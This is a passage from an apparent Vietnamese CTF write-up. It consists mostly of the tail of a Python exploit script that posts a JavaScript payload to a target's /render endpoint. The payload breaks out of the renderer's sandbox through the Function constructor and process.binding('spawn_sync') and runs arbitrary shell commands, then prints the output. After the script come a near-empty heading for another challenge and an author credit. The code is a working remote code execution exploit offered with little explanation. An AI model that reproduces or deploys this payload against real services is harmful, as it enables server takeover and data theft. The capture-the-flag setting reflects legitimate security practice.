    js_payload = f"""
    <script>
    try {{
        const process = this.constructor.constructor("return process")();
        const spawn = process.binding("spawn_sync");
        
        // Cấu trúc options cho spawn_sync binding
        const opts = {{
            file: '/bin/sh',
            args: ['sh', '-c', '{CMD_TO_RUN}'],
            envPairs: [],
            stdio: [
                {{type:'pipe',readable:true,writable:false}},
                {{type:'pipe',readable:false,writable:true}},
                {{type:'pipe',readable:false,writable:true}}
            ]
        }};
        
        const result = spawn.spawn(opts);
        
        // result.output[1] là stdout (buffer)
        const output = String.fromCharCode.apply(null, new Uint8Array(result.output[1]));
        const error = String.fromCharCode.apply(null, new Uint8Array(result.output[2]));
        
        document.body.innerHTML = output + error;
    }} catch(e) {{
        document.body.innerHTML = e.toString();
    }}
    </script>
    """
    
    render_payload = {
        "html": js_payload
    }

    try:
        r2 = s.post(
            f"{TARGET_URL}/render",
            json=render_payload,
            headers={"Content-Type": "application/json"}
        )
        
        print("-" * 30)
        print("[FLAG] Output retrieved:")
        print(r2.text)
        print("-" * 30)
        
    except Exception as e:
        print(f"[!] Error triggering RCE: {e}")

if __name__ == "__main__":
    exploit()
```























































# 0xClinic
![image](https://hackmd.io/_uploads/SyFinLdIZe.png)
## Overview 
![image](https://hackmd.io/_uploads/BJeVcYO8Wl.png)
- 










=================================================================

ĐƯỢC VIẾT LẠI BỞI : **p1c0L0** AND **TIWZA**






